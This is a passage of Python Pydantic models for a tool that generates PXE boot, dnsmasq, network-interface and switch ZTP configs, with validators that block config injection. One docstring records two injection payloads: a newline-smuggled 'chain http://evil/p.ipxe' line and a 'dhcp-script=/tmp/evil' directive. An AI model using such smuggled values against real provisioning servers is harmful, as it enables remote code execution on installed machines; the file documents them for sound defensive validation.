    def _check_disk_config(cls, v, info):
        if not v:
            return {}
        dc = PxeDiskConfigIn.model_validate(v).model_dump(exclude_unset=True)
        # layout/os_type 相关的规则在这里补一次：本层才知道 os_type 与 disk_scheme
        # （os_type / disk_scheme 都声明在 disk_config 之前，所以 info.data 里已经有了）。
        data = info.data or {}
        _disk_check_layout_rules(dc, data.get("os_type", ""), data.get("disk_scheme", "lvm"))
        return dc
    net_mode: str = "dhcp"        # dhcp / static
    net_config: dict[str, Any] = {}
    mirror: str = ""
    extra_packages: list[str] = []
    post_script: str = ""
    remark: str = ""
    # PXE 服务端参数
    server_ip: str = "192.168.1.100"
    http_root: str = "http://192.168.1.100:8000/pxe"
    kernel_path: str = ""
    initrd_path: str = ""
    squashfs_path: str = ""
    deploy_mode: str = "standalone"  # standalone / proxy / relay


class PxeProfileOut(ORMBase):
    id: str
    name: str
    os_type: str
    os_version: str
    timezone: str
    locale: str
    keyboard: str
    admin_user: str
    ssh_keys: list = []
    disk_scheme: str
    disk_config: dict = {}
    net_mode: str
    net_config: dict = {}
    mirror: str
    extra_packages: list = []
    post_script: str = ""
    remark: str = ""
    server_ip: str = ""
    http_root: str = ""
    kernel_path: str = ""
    initrd_path: str = ""
    squashfs_path: str = ""
    created_at: Optional[datetime] = None


class PxeInstallIn(BaseModel):
    profile_id: str
    hostname: str
    mac: str
    ip: Optional[str] = None


    @field_validator("mac")
    @classmethod
    def _check_mac(cls, v: str) -> str:
        return _require_mac(v)


    @field_validator("hostname")
    @classmethod
    def _check_hostname(cls, v: str) -> str:
        # 空串视为未填（生成期回退到模板 hostname），非空必须过 RFC1123 单标签
        return v if not v else _require_hostname(v)


    @field_validator("ip")
    @classmethod
    def _check_ip(cls, v: Optional[str]) -> Optional[str]:
        # None/空串视为未填；给了就必须是合法 IPv4（D7）
        return _require_ipv4(v, kind="address") if v else v

class PxeInstallOut(ORMBase):
    id: str
    profile_id: str
    hostname: str
    mac: str
    ip: Optional[str] = None
    status: str
    created_at: Optional[datetime] = None
    finished_at: Optional[datetime] = None


# ---------- PXE 生成/部署请求体（D7 第 2 层；U-C 建，api/pxe.py 的 U-D 用；字段与默认值按规格写死） ----------
class PxeInstallItem(BaseModel):
    """generate/download body 里 installs 的逐项模型（D7）。"""

    mac: str                    # 必填，必须是 aa:bb:cc:dd:ee:ff（大小写不敏感）
    hostname: str = ""          # 可选；给了就必须是 RFC1123 单标签
    ip: Optional[str] = None    # 可选；给了就必须是合法 IPv4


    @field_validator("mac")
    @classmethod
    def _check_mac(cls, v: str) -> str:
        return _require_mac(v)


    @field_validator("hostname")
    @classmethod
    def _check_hostname(cls, v: str) -> str:
        return v if not v else _require_hostname(v)


    @field_validator("ip")
    @classmethod
    def _check_ip(cls, v: Optional[str]) -> Optional[str]:
        return _require_ipv4(v, kind="address") if v else v


class PxeNetConfigIn(BaseModel):
    """generate/download/deploy body 里 net_config 的带校验模型（D7 附加）。

    只声明 _dnsmasq() 直接插值的五个键并逐键校验（interface 网卡名白名单；
    gateway/dns_server/dhcp_start/dhcp_end 走 IPv4），非法值在 HTTP 层 422。
    未知键必须容忍：生产 deploy 会把 detect_network() 的结果并进 net_config，
    其中含 warnings: list[str]（还有 server_ip 等）——所以 extra="allow"
    原样保留未知键，绝不因未知键 422；未知键经 model_dump() 原样回传。
    """

    model_config = ConfigDict(extra="allow")

    interface: Optional[str] = None   # 网卡名白名单
    gateway: Optional[str] = None
    dns_server: Optional[str] = None
    dhcp_start: Optional[str] = None
    dhcp_end: Optional[str] = None


    @field_validator("interface")
    @classmethod
    def _check_interface(cls, v: Optional[str]) -> Optional[str]:
        return _require_ifname(v) if v else v


    @field_validator("gateway", "dns_server", "dhcp_start", "dhcp_end")
    @classmethod
    def _check_ipv4_fields(cls, v: Optional[str]) -> Optional[str]:
        return _require_ipv4(v, kind="address") if v else v


    @model_serializer
    def _serialize_only_set(self) -> dict:
        """序列化只输出「有值的键」：未填（None）的声明键不输出，未知键原样输出。

        这样把 model_dump() 结果 update 进 net_config 时，不会用 None 覆盖
        已有/探测到的值（detect_network() 就是「只放有值键」的约定），
        也不会丢掉 warnings/server_ip 等附加键。
        """
        out: dict = dict(self.__pydantic_extra__ or {})
        for key in ("interface", "gateway", "dns_server", "dhcp_start", "dhcp_end"):
            val = getattr(self, key)
            if val is not None:
                out[key] = val
        return out


class PxeGenerateIn(BaseModel):
    """generate / download / deploy 三个入口的请求体模型（D7 第 2 层）。

    字段名与默认值按规格原文写死，前端 Pxe.vue 实测发送的形状必须原样通过：
    - generate/download：hostname/server_ip/http_root/kernel_path/initrd_path/
      squashfs_path/deploy_mode + installs:[{mac, hostname}]
    - deploy：只发 deploy_mode、server_ip（server_ip 可为空串=由后端自动探测）
    """

    hostname: str = "default"          # RFC1123 单标签
    server_ip: str = ""                # 给了就必须是合法 IPv4
    http_root: str = ""
    kernel_path: str = ""
    initrd_path: str = ""
    squashfs_path: str = ""
    # 可挂载安装介质：留空则按 os_type/os_version 在 /srv/opstk/iso 自动匹配
    iso_url: str = ""
    # 内核控制台：留空则用后端默认值（带串口，便于无显示器机器的装机排障）
    kernel_console: str = ""
    # RHEL 系：stage2（含 images/ 的那一层）与额外仓库（如 AppStream）。
    # 留空时后端会按 mirror 指向的本机发布目录自动探测。
    stage2: str = ""
    extra_repos: list = []
    deploy_mode: str = "standalone"    # standalone / proxy / relay
    net_config: PxeNetConfigIn = PxeNetConfigIn()
    installs: list[PxeInstallItem] = []


    @field_validator("hostname")
    @classmethod
    def _check_hostname(cls, v: str) -> str:
        return v if not v else _require_hostname(v)


    @field_validator("server_ip")
    @classmethod
    def _check_server_ip(cls, v: str) -> str:
        return v if not v else _require_ipv4(v, kind="server_ip")


    @field_validator("deploy_mode")
    @classmethod
    def _check_deploy_mode(cls, v: str) -> str:
        # 空串回退默认（生成器按 mode or "standalone" 处理）；非空必须落在本行
        # 注释给出的三值白名单内：未知值会被 _mode_label() 原样拼进 dnsmasq.conf
        # 的 "# 部署模式: " 注释行，含换行即可注入新的指令行。
        if not v:
            return v
        if v not in ("standalone", "proxy", "relay"):
            raise ValueError(
                f"invalid deploy_mode {v!r}: must be one of standalone/proxy/relay"
            )
        return v


    @field_validator("*")
    @classmethod
    def _reject_control_chars(cls, v):
        """任何字符串字段都不允许换行/控制字符（第 2 层）。

        这些字段会被原样拼进 iPXE 脚本、dnsmasq.conf、autoinstall YAML 与 kickstart，
        而它们全都以**换行分隔行** —— 一个换行就能注入一整行。实测（改前）：
          iso_url   = "http://x/y.iso\\nchain http://evil/p.ipxe"
              → boot.ipxe 里多出一行 `chain http://evil/p.ipxe`，
                裸机在装机时会去执行攻击者脚本；
          http_root = "http://x\\ndhcp-script=/tmp/evil"
              → dnsmasq.conf 里多出一行 `dhcp-script=/tmp/evil/boot.ipxe`，
                而该 conf 由**宿主 root dnsmasq** 加载（compose 把 /etc/dnsmasq.d 挂进容器），
                属 root 级影响面。
        generator 第 3 层（_validate_lines/_safe_line）还有一次统一兜底；
        这里先拦一次是为了给出"到底是哪个字段"的精确 422。
        （PxeProfileIn 的 post_script 是多行字段，所以那边不加通配校验。）
        """
        if isinstance(v, str) and any(ord(ch) < 0x20 or ord(ch) == 0x7F for ch in v):
            raise ValueError("不允许包含换行或控制字符（会造成配置注入）")
        return v


class PxeGenerateResult(BaseModel):
    files: dict[str, str] = {}


# ---------- IT 网络配置生成 ----------
class NetInterfaceIn(BaseModel):
    name: str                       # 网卡名 eth0 / ens33 / eno1
    mode: str = "static"            # static / dhcp
    ip: Optional[str] = None
    netmask: Optional[str] = None   # 或 cidr
    cidr: Optional[int] = None
    gateway: Optional[str] = None
    dns: list[str] = []


    @field_validator("name")
    @classmethod
    def _check_name(cls, v: str) -> str:
        return _require_ifname(v)

    @field_validator("mode")
    @classmethod
    def _check_mode(cls, v: str) -> str:
        return _require_mode(v)

    @field_validator("ip", "gateway")
    @classmethod
    def _check_ip_gateway(cls, v: Optional[str]) -> Optional[str]:
        # 空串 = 表单没填（与 PxeInstallIn._check_ip 同一约定），不要当成非法地址报错
        return _require_ipv4(v, kind="address") if v else None

    @field_validator("netmask")
    @classmethod
    def _check_netmask(cls, v: Optional[str]) -> Optional[str]:
        return _require_netmask(v) if v else None

    @field_validator("cidr")
    @classmethod
    def _check_cidr(cls, v: Optional[int]) -> Optional[int]:
        return _require_cidr(v)

    @field_validator("dns")
    @classmethod
    def _check_dns(cls, v: list[str]) -> list[str]:
        return _require_dns_list(v)


class NetBondIn(BaseModel):
    name: str                       # bond0
    mode: int = 1                   # 0..6
    interfaces: list[str]           # 从接口
    ip: Optional[str] = None
    netmask: Optional[str] = None
    cidr: Optional[int] = None
    gateway: Optional[str] = None
    dns: list[str] = []
    miimon: int = 100
    primary: Optional[str] = None   # active-backup 主接口
    lacp_rate: Optional[str] = None  # 802.3ad: slow / fast
    xmit_hash_policy: Optional[str] = None  # balance-xor/802.3ad: layer2 / layer2+3 / layer3+4


    @field_validator("name")
    @classmethod
    def _check_name(cls, v: str) -> str:
        return _require_ifname(v)

    @field_validator("mode")
    @classmethod
    def _check_mode(cls, v: int) -> int:
        if not 0 <= v <= 6:
            raise ValueError(f"bond mode must be an integer in 0..6, got {v!r}")
        return v

    @field_validator("ip", "gateway")
    @classmethod
    def _check_ip_gateway(cls, v: Optional[str]) -> Optional[str]:
        return _require_ipv4(v, kind="address") if v else None

    @field_validator("netmask")
    @classmethod
    def _check_netmask(cls, v: Optional[str]) -> Optional[str]:
        return _require_netmask(v) if v else None

    @field_validator("cidr")
    @classmethod
    def _check_cidr(cls, v: Optional[int]) -> Optional[int]:
        return _require_cidr(v)

    @field_validator("dns")
    @classmethod
    def _check_dns(cls, v: list[str]) -> list[str]:
        return _require_dns_list(v)

    # primary/lacp_rate/xmit_hash_policy 会以 `primary=<值>` 的形式拼进 nmcli 的
    # bond.options 与 ifcfg 的 BONDING_OPTS="..."（双引号内层再用 _sh 引用）。
    # 值里带空格或引号会破坏这层引号结构（让 BONDING_OPTS 被截断），所以按字段语义白名单化：
    # primary 必须是网卡名，另两个取自 netplan/nmcli 的固定取值。
    @field_validator("primary")
    @classmethod
    def _check_primary(cls, v: Optional[str]) -> Optional[str]:
        return _require_ifname(v) if v else None

    @field_validator("lacp_rate")
    @classmethod
    def _check_lacp_rate(cls, v: Optional[str]) -> Optional[str]:
        if not v:
            return None
        if v not in ("slow", "fast"):
            raise ValueError(f"invalid lacp_rate {v!r}: must be one of slow/fast")
        return v

    @field_validator("xmit_hash_policy")
    @classmethod
    def _check_xmit_hash_policy(cls, v: Optional[str]) -> Optional[str]:
        if not v:
            return None
        if v not in ("layer2", "layer2+3", "layer3+4"):
            raise ValueError(
                f"invalid xmit_hash_policy {v!r}: must be one of layer2/layer2+3/layer3+4"
            )
        return v


class NetVlanIn(BaseModel):
    parent: str                     # 父接口
    vlan_id: int
    mode: str = "static"
    ip: Optional[str] = None
    netmask: Optional[str] = None
    cidr: Optional[int] = None
    gateway: Optional[str] = None
    # dns：前端 VLAN 行一直有这个输入框，但模型没有该字段 → pydantic 默认忽略未知键，
    # 运维填的 DNS 静默消失。这里补上，三条生成路径都已支持（netplan nameservers /
    # nmcli ipv4.dns / ifcfg DNS1..N）。
    dns: list[str] = []


    @field_validator("parent")
    @classmethod
    def _check_parent(cls, v: str) -> str:
        return _require_ifname(v)

    @field_validator("vlan_id")
    @classmethod
    def _check_vlan_id(cls, v: int) -> int:
        if not 1 <= v <= 4094:
            raise ValueError(f"vlan_id must be an integer in 1..4094, got {v!r}")
        return v

    @field_validator("mode")
    @classmethod
    def _check_mode(cls, v: str) -> str:
        return _require_mode(v)

    @field_validator("ip", "gateway")
    @classmethod
    def _check_ip_gateway(cls, v: Optional[str]) -> Optional[str]:
        return _require_ipv4(v, kind="address") if v else None

    @field_validator("netmask")
    @classmethod
    def _check_netmask(cls, v: Optional[str]) -> Optional[str]:
        return _require_netmask(v) if v else None

    @field_validator("cidr")
    @classmethod
    def _check_cidr(cls, v: Optional[int]) -> Optional[int]:
        return _require_cidr(v)

    @field_validator("dns")
    @classmethod
    def _check_dns(cls, v: list[str]) -> list[str]:
        return _require_dns_list(v)


class NetBridgeIn(BaseModel):
    name: str                       # br0
    interfaces: list[str]
    # mode：前端网桥行有 static/dhcp 下拉，但模型没有该字段 → 选择被静默忽略。
    # None = 自动（有 ip 即静态，无 ip 即 L2/不配地址），保持老请求（不带 mode）的行为不变。
    mode: Optional[str] = None
    ip: Optional[str] = None
    netmask: Optional[str] = None
    cidr: Optional[int] = None
    gateway: Optional[str] = None
    dns: list[str] = []             # 同上：前端网桥行也有 DNS 输入框


    @field_validator("name")
    @classmethod
    def _check_name(cls, v: str) -> str:
        return _require_ifname(v)

    @field_validator("mode")
    @classmethod
    def _check_mode(cls, v: Optional[str]) -> Optional[str]:
        return _require_mode(v) if v else None

    @field_validator("ip", "gateway")
    @classmethod
    def _check_ip_gateway(cls, v: Optional[str]) -> Optional[str]:
        return _require_ipv4(v, kind="address") if v else None

    @field_validator("netmask")
    @classmethod
    def _check_netmask(cls, v: Optional[str]) -> Optional[str]:
        return _require_netmask(v) if v else None

    @field_validator("cidr")
    @classmethod
    def _check_cidr(cls, v: Optional[int]) -> Optional[int]:
        return _require_cidr(v)

    @field_validator("dns")
    @classmethod
    def _check_dns(cls, v: list[str]) -> list[str]:
        return _require_dns_list(v)


class NetConfigRequest(BaseModel):
    os: str                          # ubuntu / rhel
    hostname: Optional[str] = None
    interfaces: list[NetInterfaceIn] = []
    bonds: list[NetBondIn] = []
    vlans: list[NetVlanIn] = []
    bridges: list[NetBridgeIn] = []
    format: str = "nmcli"           # nmcli / netplan(仅ubuntu) / ifcfg(仅rhel)
    netplan_renderer: str = "networkd"  # networkd(服务器推荐) / NetworkManager(无线/动态)


    @field_validator("os")
    @classmethod
    def _check_os(cls, v: str) -> str:
        """小写归一化 + 白名单（NC3）：改前 os 是裸 str，'windows' 也能 200 并写进脚本注释。"""
        t = (v or "").strip().lower()
        if t not in _NET_OS_ALLOWED:
            raise ValueError(
                f"invalid os {v!r}: must be one of " + "/".join(_NET_OS_ALLOWED)
            )
        return t


    @field_validator("format")
    @classmethod
    def _check_format(cls, v: str) -> str:
        """小写归一化 + 白名单（NC3）：改前 format='poem' 会被当成 nmcli 静默处理。"""
        t = (v or "").strip().lower()
        if t not in _NET_FORMAT_ALLOWED:
            raise ValueError(
                f"invalid format {v!r}: must be one of " + "/".join(_NET_FORMAT_ALLOWED)
            )
        return t


    @field_validator("netplan_renderer")
    @classmethod
    def _check_renderer(cls, v: str) -> str:
        """renderer 会被原样拼进 99-opstk.yaml 的 `renderer:` 行：含换行即可注入任意 YAML 键。"""
        if v not in _NETPLAN_RENDERER_ALLOWED:
            raise ValueError(
                f"invalid netplan_renderer {v!r}: must be one of "
                + "/".join(_NETPLAN_RENDERER_ALLOWED)
            )
        return v


    @field_validator("hostname")
    @classmethod
    def _check_hostname(cls, v: Optional[str]) -> Optional[str]:
        if not v:
            return None   # 空串 = 未填（前端 hostname 输入框默认就是空串）
        if _HOSTNAME_RE.fullmatch(v) is None:
            raise ValueError(
                f"invalid hostname {v!r}: must be an RFC1123 single label matching {_HOSTNAME_PATTERN}"
            )
        return v


    @model_validator(mode="after")
    def _check_cross_rules(self):
        """跨字段规则（NC3）：format×os、非空、逐设备 IPv4（含网关必须在同子网内）。

        「多个默认网关」刻意**不**在这里拒绝：管理口 + bond 各带一个网关是合法拓扑
        （既有测试 test_netplan_full 就是这种形状），拒绝会把它们一起打死。
        改由 generator._route_metrics 按声明顺序给每个默认路由写出确定的 metric
        （100/200/300…），报文里不再出现「同 metric 的多条 to: default」。
        """
        if self.format == "netplan" and self.os != "ubuntu":
            raise ValueError(
                f"format='netplan' 仅支持 os='ubuntu'（当前 os='{self.os}'）："
                f"RHEL 上没有 /etc/netplan，改前会静默降级成 nmcli 脚本，"
                f"请改用 format='nmcli' 或 'ifcfg'"
            )
        if self.format == "ifcfg" and self.os != "rhel":
            raise ValueError(
                f"format='ifcfg' 仅支持 os='rhel'（当前 os='{self.os}'）："
                f"Ubuntu 上没有 /etc/sysconfig/network-scripts，"
                f"请改用 format='netplan' 或 'nmcli'"
            )
        if not (self.interfaces or self.bonds or self.vlans or self.bridges):
            raise ValueError(
                "interfaces/bonds/vlans/bridges 不能全为空：当前请求不会配置任何网络设备，"
                "只会生成一个只有 version+renderer 的空文件"
            )

        # 被 bond/bridge 引用的从接口不配地址（生成器整段跳过它），所以不要求它填 ip。
        slave_names: set[str] = set()
        for b in self.bonds:
            slave_names.update(b.interfaces)
        for br in self.bridges:
            slave_names.update(br.interfaces)

        for i, o in enumerate(self.interfaces):
            _check_l3(
                f"interfaces[{i}]", mode=o.mode, ip=o.ip, netmask=o.netmask,
                cidr=o.cidr, gateway=o.gateway,
                require_ip_when_static=o.name not in slave_names,
            )
        for i, o in enumerate(self.bonds):
            # bond 的 mode 是聚合模式（int），不是 dhcp 开关：无 ip 时保持既有语义（按 DHCP 处理）
            _check_l3(
                f"bonds[{i}]", ip=o.ip, netmask=o.netmask, cidr=o.cidr, gateway=o.gateway
            )
        for i, o in enumerate(self.vlans):
            _check_l3(
                f"vlans[{i}]", mode=o.mode, ip=o.ip, netmask=o.netmask,
                cidr=o.cidr, gateway=o.gateway,
            )
        for i, o in enumerate(self.bridges):
            _check_l3(
                f"bridges[{i}]", mode=o.mode, ip=o.ip, netmask=o.netmask,
                cidr=o.cidr, gateway=o.gateway,
            )
        return self


class NetConfigResult(BaseModel):
    script: str
    format: str
    filename: str


# ---------- CT ZTP ?? ----------
class ZtpDeviceIn(BaseModel):
    template_id: str = ""
    hostname: str = ""
    mac: str = ""
    serial: str = ""
    mgmt_ip: Optional[str] = None


class ZtpDeviceOut(ORMBase):
    id: str
    template_id: str
    hostname: str
    mac: str
    serial: str
    mgmt_ip: Optional[str] = None
    created_at: Optional[datetime] = None


class ZtpTemplateIn(BaseModel):
    name: str
    vendor: str = "h3c"                    # h3c / huawei / cisco
    mgmt_vlan: int = 10
    mgmt_interface: str = "Vlan-interface10"
    mgmt_netmask: str = "255.255.255.0"
    mgmt_gateway: str = "10.0.0.254"
    dns_servers: list[str] = ["114.114.114.114"]
    ntp_server: str = "10.0.0.254"
    snmp_community: str = "public"
    domain_name: str = ""
    vlans: list[dict[str, Any]] = []
    admin_user: str = "admin"
    admin_password: Optional[str] = None
    enable_secret: Optional[str] = None
    ssh_keys: list[str] = []
    uplink_port: str = ""
    access_ports: list[str] = []
    extra_config: str = ""
    server_ip: str = "10.0.0.250"
    tftp_root: str = "/srv/tftp"
    http_root: str = "http://10.0.0.250:8000/ztp"
    deploy_mode: str = "standalone"
    dhcp_iface: str = "eth0"
    dhcp_start: str = "10.0.0.100"
    dhcp_end: str = "10.0.0.200"
    remark: str = ""


class ZtpTemplateOut(ORMBase):
    id: str
    name: str
    vendor: str
    mgmt_vlan: int
    mgmt_interface: str
    mgmt_netmask: str
    mgmt_gateway: str
    dns_servers: list = []
    ntp_server: str
    snmp_community: str
    domain_name: str
    vlans: list = []
    admin_user: str
    ssh_keys: list = []
    uplink_port: str
    access_ports: list = []
    extra_config: str
    server_ip: str
    tftp_root: str
    http_root: str
    deploy_mode: str
    dhcp_iface: str
    dhcp_start: str
    dhcp_end: str
    remark: str
    created_at: Optional[datetime] = None


class ZtpGenerateResult(BaseModel):
    files: dict[str, str] = {}

